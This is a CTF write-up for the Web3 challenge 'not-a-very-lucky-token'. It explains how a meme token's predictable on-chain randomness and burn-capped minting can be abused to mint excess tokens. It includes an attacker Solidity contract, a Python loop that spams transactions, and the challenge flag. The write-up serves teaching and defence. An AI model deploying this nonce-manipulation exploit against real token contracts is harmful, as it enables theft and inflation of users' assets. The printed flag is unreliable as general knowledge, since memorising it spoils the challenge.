# not-a-very-lucky-token

In this Web3 CTF challenge, we analyze a quirky ERC20-like meme token ("LuckyToken") that mints or burns tokens based on a pseudo-random calculation. Despite its innocuous facade, the token contains logic that can be exploited to mint an arbitrary amount of tokens, provided certain conditions are met—particularly when a TeamVault contract unlocks a large supply after the token’s transaction count surpasses a threshold.

This writeup follows the format of our example/template. We will cover:

- **Challenge Overview**  
- **Token Mechanics**  
- **Vulnerability Analysis**  
- **Exploit Demonstration**  
- **Key Takeaways**  
- **Flag**  

---

## Challenge Overview

### Goal

The challenge is titled **"not-a-very-lucky-token"** with the objective of abusing the token’s transfer logic to eventually mint more tokens than the protocol designers intended. In doing so, you will gain a significant supply of LuckyToken—enough to surpass normal limitations—and retrieve the challenge flag.

### Setup

You are given:

1. A **LuckyToken** contract that mints or burns tokens based on a pseudo-random calculation using a nonce.  
2. A **TeamVault** contract that holds a large number of tokens belonging to the “team.” This vault automatically releases them (deposits them into a **LockStaking** contract) once the token’s `txCount` exceeds 10.  
3. A snippet of code (and partial source) illustrating how LuckyToken manipulates `_amount` during transfers.  

Your task: Exploit the LuckyToken’s *mint/burn* mechanics—particularly leveraging the team tokens once they unlock—to mint (or “ice”) more tokens for yourself.

---

## Token Mechanics

Below is the core logic from LuckyToken’s transfer process (simplified for clarity):

```solidity
bool status = ((nonce % 101) & 1) == 0;
uint256 pendingAmount = (_amount * (status ? ICE : FIRE)) / 100;

if (status) {
    // "Ice": attempt to mint
    if (totalAmountMinted + pendingAmount < totalAmountBurned) {
        super._mint(_sender, pendingAmount);
        totalAmountMinted += pendingAmount;
        emit Ice(_sender, pendingAmount);
    }
} else {
    // "Fire": burn
    super._burn(_sender, pendingAmount);
    totalAmountBurned += pendingAmount;
    _amount -= pendingAmount;
    emit Fire(_sender, pendingAmount);
}

// The transfer count increments, and the _amount is further reduced
txCount += 1;
_amount -= 1;
```

### Key Observations

1. **Pseudo-random status**  
   The transfer logic depends on `(nonce % 101) & 1` to decide if the token supply is minted (`status = true`) or burned (`status = false`).

2. **Mint Limited by Burn**  
   LuckyToken only mints new tokens if `totalAmountMinted + pendingAmount < totalAmountBurned`. Essentially, the code enforces that the total minted supply *cannot exceed* the total burned supply at any time.

3. **Transaction Count Trigger**  
   Once `txCount > 10`, the `TeamVault.release()` function becomes callable, deploying a LockStaking contract and transferring a large portion of tokens (originally from the team) to that LockStaking contract.  

4. **TeamVault and LockStaking**  
   When the vault “releases,” it effectively places a huge token supply into the LockStaking contract. From there, additional transfers can occur—these transfers can trigger more potential burn events, increasing `totalAmountBurned`, which in turn raises the cap on `totalAmountMinted`.

---

## Vulnerability Analysis

The token’s design inadvertently allows an attacker to:

1. **Force Burn Events to Increase the Minting Cap**  
   By repeatedly triggering the `status = false` path, you can burn tokens and increase `totalAmountBurned`, thereby increasing the threshold that allows future minting.

2. **Exploit Team Tokens After They Unlock**  
   Once `txCount` exceeds 10, the huge token balance from the TeamVault is moved into LockStaking. Any transfers from LockStaking (or the vault) can be forced to burn large amounts of tokens, inadvertently raising the allowable minting limit.

3. **Nonce Manipulation**  
   Because the logic checks `(nonce % 101) & 1`, an attacker can craft transactions (or increment a local offset) until they achieve a `status = true` (a “mint” event), letting them mint tokens. You can also aim for `status = false` intentionally to push more burns and enable even *larger* future mints.

### Where It Breaks

Once you can consistently force burn events on the large supply from TeamVault (or LockStaking), you **dramatically** increase `totalAmountBurned`. The contract’s rule that “minted tokens must be less than burned tokens” ceases to be a real barrier because you have effectively inflated `totalAmountBurned`. In subsequent transfers, you can easily pivot to `status = true`, minting large sums in a single transaction.

---

## Exploit Demonstration

### High-Level Steps

1. **Initialize**:  
   - Acquire some LuckyToken and trigger enough transactions (e.g. trivial self-transfers) to increase `txCount` to >10.  
   - This allows the `TeamVault.release()` function to move the big stash of tokens into LockStaking.

2. **Burn Some Vault/LockStaking Tokens**:  
   - By carefully timing transactions or by brute-forcing the nonce calculation, make sure `status = false` triggers on large transfers from the LockStaking (or vault).  
   - Each burn increases `totalAmountBurned` significantly.

3. **Mint for Profit**:  
   - After your burn threshold is sufficiently high, craft a transaction where `status = true` so that your minted tokens `(pendingAmount)` can be huge (since `pendingAmount < totalAmountBurned` is now easy to satisfy).

### Example: On-Chain Nonce Calculation

An attacker contract might look like this:

```solidity
function go(LuckyToken token) public {
    uint256 lastNonce = token.nonce();
    uint256 amt = token.balanceOf(address(this));
    uint256 p = 0;

    while (true) {
        // Hypothetically calls a function that calculates next nonce on-chain
        uint256 nextNonce = token._calculateNonce(
            address(this),
            address(this),
            block.timestamp,
            amt - p,
            lastNonce,
            blockhash(block.number - 1)
        );

        bool status = ((nextNonce % 101) & 1) == 0; 
        if (status) {
            // "Ice" path => attempt mint
            token.transfer(address(this), (amt - p));
            break;
        } else {
            // "Fire" path => effectively burn some fraction
            p += 1;
        }
    }
}
```

This simplistic snippet tries to guess or shift the amount `_amount` until the pseudo-random `status` is `true` so that we can mint tokens. A more sophisticated approach systematically calls transfers to reliably produce burn or mint results as needed.

### Python Script for Batch Transactions

If block times allow, an attacker might spam transactions until the desired random outcome is achieved:

```python
import sys
import os

nonce_start = int(sys.argv[1])  # starting nonce
n = 100  # number of attempts

for i in range(n):
    pvkey = "0x1b2a2dc0f504c816a7b7...some_placeholder..." + str(i)
    cmd = (
        f"cast send --rpc-url $RPC_URL "
        f"--private-key {pvkey} "
        f"0xf5D6DBF41522D86A904791D9b0784149cB143bD5 " # attacker contract
        f"'go(address)' 0xc79FF5A0c740939Ab34Cb6226fC7055f85A7d237"  # LuckyToken
    )
    os.system(cmd)
```

In essence, repeated calls are made until you force the outcome you want, either to burn (boost `totalAmountBurned`) or to mint (profit from the newly raised cap).

---

## Key Takeaways

1. **Pseudo-Randomness Pitfalls**:  
   Relying on simple on-chain values (like `nonce`, blockhash, or block timestamp) for randomness is highly exploitable.

2. **Mint Limit Tied to Burn**:  
   A design that caps minting by the running total of burned tokens can be bypassed when a large supply is forcibly burned in repeated transfers.

3. **Beware of Large Unlock Events**:  
   Any “team tokens” or “vaulted liquidity” that can be moved after a certain condition can become an avenue for large-scale exploitation if it interacts with flawed logic.

4. **Meme Tokens Are Not Always Harmless**:  
   Even a “joke” token can pose serious security issues, especially if it integrates with real liquidity or third-party protocols.

---

## Flag

After performing these steps and successfully minting far more tokens than the original burn-mint logic intended, you’ll fulfill the challenge conditions and retrieve the flag:

```
rctf{lucky_f0r_y0u_m4yb3_h3h3_aec634b53e47a1026285e978}
```
